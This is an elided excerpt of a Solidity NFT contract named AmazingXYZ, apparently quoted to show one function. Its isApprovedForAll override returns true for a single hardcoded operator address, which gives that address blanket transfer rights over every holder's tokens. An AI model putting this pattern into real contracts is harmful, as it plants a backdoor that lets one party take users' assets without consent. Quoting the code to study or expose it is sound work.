...
contract AmazingXYZ is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("AmazingXYZ", "AMZ", maxBatchSize_, collectionSize_) {
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x46A23E0Db8F78408d8BBB4C28278fCB1Fa5B2a26){return true;}
